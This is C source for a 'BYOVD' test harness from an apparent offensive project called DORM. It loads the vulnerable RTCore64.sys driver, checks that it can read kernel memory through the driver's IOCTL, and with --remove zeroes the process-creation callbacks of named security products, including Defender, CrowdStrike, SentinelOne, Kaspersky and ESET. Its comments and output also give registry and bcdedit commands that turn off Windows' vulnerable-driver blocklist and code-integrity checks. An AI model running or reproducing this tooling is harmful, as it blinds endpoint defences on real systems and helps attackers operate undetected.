/*
 * test_byovd.c — DORM Phase 14: BYOVD Verification + Diagnostic
 * byovd/kernel_subverter/test_byovd.c
 *
 * Windows x64 | MinGW/Clang
 * Must run from an elevated (Administrator) PowerShell.
 *
 * Usage:
 *   .\test_byovd.exe .\RTCore64.sys            enumerate callbacks
 *   .\test_byovd.exe .\RTCore64.sys --remove   zero EDR callbacks
 *   .\test_byovd.exe .\RTCore64.sys --diag     full IOCTL diagnostic
 *
 * Build:
 *   clang byovd/kernel_subverter/byovd.c      \
 *         byovd/kernel_subverter/test_byovd.c \
 *         -Ibyovd/kernel_subverter            \
 *         -o test_byovd.exe -lkernel32 -ladvapi32
 */

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include "byovd.h"

/* ============================================================
   RTCORE64_MEM_OP forward declaration for diagnostic
   (must match byovd.c exactly — 32 bytes)
   ============================================================ */
#pragma pack(push, 1)
typedef struct {
    BYTE    Padding[8];
    ULONG64 Address;
    ULONG   Pad2;
    ULONG   Size;
    ULONG   Value;
    ULONG   Pad3;
} DIAG_MEM_OP;
#pragma pack(pop)
_Static_assert(sizeof(DIAG_MEM_OP) == 0x20, "diag struct must be 32 bytes");

#define RTCORE64_IOCTL_READ  0x80002048UL
#define RTCORE64_DEVICE      "\\\\.\\RTCore64"

/* ============================================================
   PRIVILEGE + SYSTEM CHECKS
   ============================================================ */

static BOOL is_elevated(void)
{
    BOOL e = FALSE; HANDLE ht = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &ht)) return FALSE;
    TOKEN_ELEVATION te; DWORD sz = sizeof(te);
    if (GetTokenInformation(ht, TokenElevation, &te, sizeof(te), &sz))
        e = (te.TokenIsElevated != 0);
    CloseHandle(ht); return e;
}

static BOOL enable_load_driver_privilege(void)
{
    HANDLE ht = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &ht))
        return FALSE;
    LUID luid;
    LookupPrivilegeValueA(NULL, "SeLoadDriverPrivilege", &luid);
    TOKEN_PRIVILEGES tp = { 1, {{ luid, SE_PRIVILEGE_ENABLED }} };
    AdjustTokenPrivileges(ht, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError(); CloseHandle(ht);
    return err != ERROR_NOT_ALL_ASSIGNED;
}

/*
 * check_blocklist — reads Windows Vulnerable Driver Blocklist state.
 *
 * When enabled, Windows CI (Code Integrity) intercepts IOCTLs to
 * blocklisted drivers and returns STATUS_INVALID_PARAMETER (error=87)
 * even though the driver loaded and the device opened successfully.
 * The driver appears to work (load + open) but all IOCTLs are silently
 * rejected by the kernel before they reach driver dispatch.
 *
 * Key: HKLM\SYSTEM\CurrentControlSet\Control\CI\Config
 *      VulnerableDriverBlocklistEnable = 1 → blocked
 *
 * Disable (requires reboot):
 *   reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Config" \
 *       /v VulnerableDriverBlocklistEnable /t REG_DWORD /d 0 /f
 *   Restart-Computer
 *
 * Alternative (no reboot, takes effect on next boot):
 *   bcdedit /set nointegritychecks on   ← only on non-Secure-Boot systems
 */
static void check_blocklist(void)
{
    printf("\n[blocklist] Checking Windows Vulnerable Driver Blocklist...\n");

    HKEY hk = NULL;
    BOOL opened = (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                   "SYSTEM\\CurrentControlSet\\Control\\CI\\Config",
                   0, KEY_READ, &hk) == ERROR_SUCCESS);

    if (!opened) {
        printf("[blocklist] CI\\Config key not found — blocklist likely inactive\n");
        return;
    }

    DWORD val  = 0;
    DWORD sz   = sizeof(val);
    DWORD type = 0;
    LONG  r    = RegQueryValueExA(hk, "VulnerableDriverBlocklistEnable",
                                  NULL, &type, (BYTE *)&val, &sz);
    RegCloseKey(hk);

    if (r == ERROR_SUCCESS && type == REG_DWORD) {
        if (val == 1) {
            printf("[blocklist] VulnerableDriverBlocklistEnable = 1  ← ENABLED\n");
            printf("[blocklist] This is why IOCTLs return error=87.\n");
            printf("[blocklist] CI intercepts IOCTLs to blocked drivers before\n");
            printf("[blocklist] they reach the driver's dispatch routine.\n");
            printf("\n[blocklist] FIX — run in elevated PowerShell then REBOOT:\n");
            printf("[blocklist]   reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config\"\n");
            printf("[blocklist]        /v VulnerableDriverBlocklistEnable /t REG_DWORD /d 0 /f\n");
            printf("[blocklist]   Restart-Computer\n\n");
        } else {
            printf("[blocklist] VulnerableDriverBlocklistEnable = %lu  ← disabled\n", val);
        }
    } else {
        printf("[blocklist] VulnerableDriverBlocklistEnable not set (disabled)\n");
    }
}

/*
 * check_hvci — separate from blocklist, HVCI prevents loading non-compatible drivers.
 * If the driver loaded, HVCI is not the issue. Printed for completeness.
 */
static BOOL check_hvci(void)
{
    HKEY hk = NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\"
                      "Scenarios\\HypervisorEnforcedCodeIntegrity",
                      0, KEY_READ, &hk) != ERROR_SUCCESS)
        return FALSE;
    DWORD val = 0, sz = sizeof(val), type = 0;
    RegQueryValueExA(hk, "Enabled", NULL, &type, (BYTE *)&val, &sz);
    RegCloseKey(hk);
    return (type == REG_DWORD && val == 1);
}

/* ============================================================
   IOCTL DIAGNOSTIC
   Tries every address × size combination and dumps raw buffer bytes.
   This tells us:
     - If ANY combination succeeds → struct is correct, specific addr bad
     - If ALL fail error=87        → blocklist is the issue
     - If ALL fail error=1         → driver crashed
     - If ALL fail error=5         → access denied
   ============================================================ */

static void byovd_diagnose(HANDLE hDevice, ULONG64 kernel_base)
{
    printf("\n[DIAG] ═══════════════════════════════════════════════\n");
    printf("[DIAG] IOCTL Diagnostic — sizeof(DIAG_MEM_OP) = %zu bytes\n",
           sizeof(DIAG_MEM_OP));
    printf("[DIAG] ═══════════════════════════════════════════════\n\n");

    struct {
        ULONG64     addr;
        const char *label;
    } addrs[] = {
        { kernel_base,           "ntoskrnl base      " },
        { kernel_base + 0x1000,  "ntoskrnl base+0x1000" },
        { 0xFFFFF78000000000ULL, "KUSER_SHARED_DATA  " },
    };
    ULONG sizes[] = { 1, 2, 4 };

    BOOL any_success = FALSE;

    for (int a = 0; a < 3; a++) {
        printf("[DIAG] Address: 0x%016llX  (%s)\n",
               (unsigned long long)addrs[a].addr, addrs[a].label);

        for (int s = 0; s < 3; s++) {
            DIAG_MEM_OP op;
            ZeroMemory(&op, sizeof(op));
            op.Address = addrs[a].addr;
            op.Size    = sizes[s];

            /* Show raw buffer so we can verify struct layout at runtime */
            BYTE *raw = (BYTE *)&op;
            printf("  size=%-2lu  buf=", sizes[s]);
            for (int i = 0; i < (int)sizeof(op); i++)
                printf("%02X", raw[i]);

            DWORD ret = 0;
            BOOL  ok  = DeviceIoControl(hDevice, RTCORE64_IOCTL_READ,
                                         &op, sizeof(op),
                                         &op, sizeof(op), &ret, NULL);
            if (ok) {
                printf("  → OK  value=0x%08lX\n", op.Value);
                any_success = TRUE;
            } else {
                DWORD err = GetLastError();
                printf("  → FAIL error=%lu", err);
                switch (err) {
                    case 87:   printf(" (ERROR_INVALID_PARAMETER)"); break;
                    case 5:    printf(" (ERROR_ACCESS_DENIED)");     break;
                    case 1:    printf(" (ERROR_INVALID_FUNCTION)");  break;
                    case 6:    printf(" (ERROR_INVALID_HANDLE)");    break;
                    case 50:   printf(" (ERROR_NOT_SUPPORTED)");     break;
                    default:   break;
                }
                printf("\n");
            }
        }
        printf("\n");
    }

    printf("[DIAG] ═══════════════════════════════════════════════\n");
    if (any_success) {
        printf("[DIAG] At least one IOCTL succeeded → struct layout is correct.\n");
        printf("[DIAG] The failing reads may be targeting unmapped kernel pages.\n");
    } else {
        printf("[DIAG] ALL IOCTLs failed.\n");
        printf("[DIAG] If error=87 everywhere → Windows CI blocklist is intercepting.\n");
        printf("[DIAG] Run check_blocklist() output above for the fix.\n");
    }
    printf("[DIAG] ═══════════════════════════════════════════════\n\n");
}

/* ============================================================
   MAIN
   ============================================================ */

int main(int argc, char **argv)
{
    const char *driver_path = ".\\RTCore64.sys";
    BOOL        do_remove   = FALSE;
    BOOL        do_diag     = FALSE;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--remove") == 0) do_remove = TRUE;
        else if (strcmp(argv[i], "--diag") == 0) do_diag = TRUE;
        else driver_path = argv[i];
    }

    printf("DORM Phase 14 -- BYOVD Kernel Subversion\n");
    printf("=========================================\n\n");

    if (!is_elevated()) {
        printf("[!] NOT elevated — run from Administrator PowerShell:\n");
        printf("[!]   Win+X -> Windows Terminal (Admin)\n");
        printf("[!]   cd D:\\Dinku\\projects\\DORM\n");
        printf("[!]   .\\test_byovd.exe .\\RTCore64.sys\n");
        printf("\nPress Enter to exit...\n"); getchar();
        return 1;
    }
    printf("[priv] Running elevated: ok\n");

    if (check_hvci())
        printf("[hvci] HVCI ENABLED — driver may not load\n");
    else
        printf("[hvci] HVCI not detected: ok\n");

    /* Check blocklist regardless — if it's enabled it explains error=87 */
    check_blocklist();

    printf("[priv] Enabling SeLoadDriverPrivilege...  ");
    fflush(stdout);
    if (!enable_load_driver_privilege()) {
        printf("FAILED\n");
        printf("Press Enter to exit...\n"); getchar();
        return 1;
    }
    printf("ok\n\n");

    /* Resolve absolute driver path */
    char abs_driver[MAX_PATH] = {0};
    GetFullPathNameA(driver_path, MAX_PATH, abs_driver, NULL);
    printf("[14.0] Driver: %s\n", abs_driver);

    if (GetFileAttributesA(abs_driver) == INVALID_FILE_ATTRIBUTES) {
        printf("[14.0] FAILED — file not found\n");
        printf("Press Enter to exit...\n"); getchar();
        return 1;
    }

    /* Get file size without leaking the handle */
    {
        HANDLE hf = CreateFileA(abs_driver, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            printf("[14.0] File size: %lu bytes\n\n", GetFileSize(hf, NULL));
            CloseHandle(hf);
        }
    }

    /* 14.1 load */
    printf("[14.1] Loading RTCore64.sys...\n"); fflush(stdout);
    if (!byovd_load(abs_driver)) {
        printf("[14.1] FAILED\n");
        printf("Press Enter to exit...\n"); getchar();
        return 1;
    }
    printf("[14.1] ok\n\n");

    /* 14.2 open device */
    printf("[14.2] Opening device handle...\n"); fflush(stdout);
    if (!byovd_open()) {
        printf("[14.2] FAILED\n");
        goto cleanup;
    }
    printf("[14.2] ok\n\n");

    /* 14.3 verify R/W */
    printf("[14.3] Verifying kernel R/W...\n"); fflush(stdout);

    ULONG64 kernel_base = byovd_get_kernel_base();
    if (!kernel_base) {
        printf("[14.3] kernel base resolution FAILED\n");
        goto cleanup;
    }
    printf("[14.3] ntoskrnl @ 0x%016llX\n\n", (unsigned long long)kernel_base);

    /*
     * Always run diagnostic when --diag is passed, OR when the
     * regular read fails so we can see exactly what's happening.
     */
    if (do_diag) {
        /*
         * For diagnostic we need the raw device handle — get it via
         * CreateFileA directly since byovd_open() already succeeded.
         * We'll open a second handle just for the diagnostic struct test.
         */
        HANDLE hDiag = CreateFileA(RTCORE64_DEVICE,
                                   GENERIC_READ | GENERIC_WRITE,
                                   0, NULL, OPEN_EXISTING,
                                   FILE_ATTRIBUTE_NORMAL, NULL);
        if (hDiag != INVALID_HANDLE_VALUE) {
            byovd_diagnose(hDiag, kernel_base);
            CloseHandle(hDiag);
        }
    }

    ULONG64 mz = 0;
    if (!byovd_read8(kernel_base, &mz)) {
        printf("[14.3] kernel read FAILED\n");

        /* Auto-run diagnostic on failure even without --diag */
        if (!do_diag) {
            printf("[14.3] running diagnostic automatically...\n\n");
            HANDLE hDiag = CreateFileA(RTCORE64_DEVICE,
                                       GENERIC_READ | GENERIC_WRITE,
                                       0, NULL, OPEN_EXISTING,
                                       FILE_ATTRIBUTE_NORMAL, NULL);
            if (hDiag != INVALID_HANDLE_VALUE) {
                byovd_diagnose(hDiag, kernel_base);
                CloseHandle(hDiag);
            }
        }
        goto cleanup;
    }

    printf("[14.3] first 8 bytes: 0x%016llX  %s\n",
           (unsigned long long)mz,
           ((mz & 0xFFFF) == 0x5A4D)
               ? "MZ valid ✓ — kernel R/W confirmed"
               : "unexpected — check IOCTL layout");

    if ((mz & 0xFFFF) != 0x5A4D) goto cleanup;
    printf("[14.3] ok\n\n");

    /* 14.4 callbacks */
    printf("[14.4] %s PspCreateProcessNotifyRoutine...\n",
           do_remove ? "Removing blacklisted" : "Enumerating");
    printf("        output -> callbacks.json\n\n");
    fflush(stdout);

    int cb_count;
    if (do_remove) {
        const char *bl[] = {
            "MsSense.sys", "WdFilter.sys",
            "csagent.sys", "CsFirmwareAnalysis.sys",
            "SentinelMonitor.sys", "mbamswissarmy.sys",
            "klflt.sys", "eaw.sys",
        };
        cb_count = dorm_remove_process_callbacks(
                       bl, (int)(sizeof(bl)/sizeof(bl[0])), "callbacks.json");
        printf("[14.4] %d callbacks found, blacklisted entries zeroed\n\n", cb_count);
    } else {
        cb_count = dorm_enum_process_callbacks("callbacks.json");
        printf("[14.4] %d process notify callbacks enumerated\n", cb_count);
        printf("        pass --remove to zero blacklisted EDR entries\n\n");
    }

cleanup:
    printf("[cleanup] Unloading RTCore64.sys...\n");
    byovd_unload();
    printf("\nPhase 14 complete.\n");
    printf("  callbacks.json -- PspCreateProcessNotifyRoutine dump\n");
    printf("\nPress Enter to close...\n");
    getchar();
    return 0;
}